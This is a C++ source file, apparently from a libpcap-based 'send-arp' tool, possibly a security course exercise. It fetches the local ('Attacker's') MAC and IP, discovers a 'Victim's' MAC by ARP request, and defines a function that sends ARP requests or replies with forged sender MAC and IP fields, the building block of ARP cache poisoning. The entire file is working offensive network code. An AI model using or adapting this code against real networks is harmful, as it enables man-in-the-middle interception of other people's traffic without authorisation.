#include "send-arp.h"

int		_get_my_mac(t_info *Info, char *ifc)
{
	struct ifreq		data;
	int					fd;

	fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(data.ifr_name, ifc);

    if (!ioctl(fd, SIOCGIFHWADDR, &data))
		Info->mac = Mac((uint8_t *)data.ifr_hwaddr.sa_data);
	else
		return (1);
	if (!ioctl(fd, SIOCGIFADDR, &data))
		Info->ip = Ip(ntohl(((struct sockaddr_in*)&data.ifr_addr)->sin_addr.s_addr));
	else
		return (1);
	
	printf("[info] Attacker's Mac Address	: %s\n", std::string(Info->mac).data());
	printf("[info] Attacker's IP Address	: %s\n", std::string(Info->ip).data());

	close(fd);
	return (0);
}

int		_get_victim_mac(pcap_t *handle, t_info *Victim, t_info *Attacker)
{
	Victim->mac = Mac("FF:FF:FF:FF:FF:FF");
	struct pcap_pkthdr		*header;
	const u_char			*packet;

	while (1)
	{
		if (_send_arp_packet(handle, 0, *Victim, *Attacker, *Attacker, *Victim))
				return (1);
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0)
			continue ;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
		{
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return (1);
        }

		EthArpPacket *arp_pkt = (EthArpPacket *)packet;

		if (arp_pkt->eth_.type() != arp_pkt->eth_.Arp)
			continue ;
		if (arp_pkt->arp_.sip() != Victim->ip)
			continue ;

		Victim->mac = arp_pkt->arp_.smac();

		printf("[info] Victim's Mac Address	: %s\n", std::string(Victim->mac).data());
		printf("[info] Victim's IP Address	: %s\n", std::string(Victim->ip).data());

		break ;
	}

	return (0);
}

int		_send_arp_packet(pcap *handle, int opcode, t_info Dest, t_info Src, t_info Sender, t_info Target)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = Dest.mac;
	packet.eth_.smac_ = Src.mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	if (opcode == 0)
		packet.arp_.op_ = htons(ArpHdr::Request);
	else if (opcode == 1)
		packet.arp_.op_ = htons(ArpHdr::Reply);
	else
	{
		printf("[Error] Arp Opcode Error\n");
		return (1);
	}

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.smac_ = Mac(Sender.mac);
	packet.arp_.sip_ = htonl(Sender.ip);
	packet.arp_.tmac_ = Mac(Target.mac);
	packet.arp_.tip_ = htonl(Target.ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0)
	{
			printf("[Error] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return (1);
	}

	return (0);
}
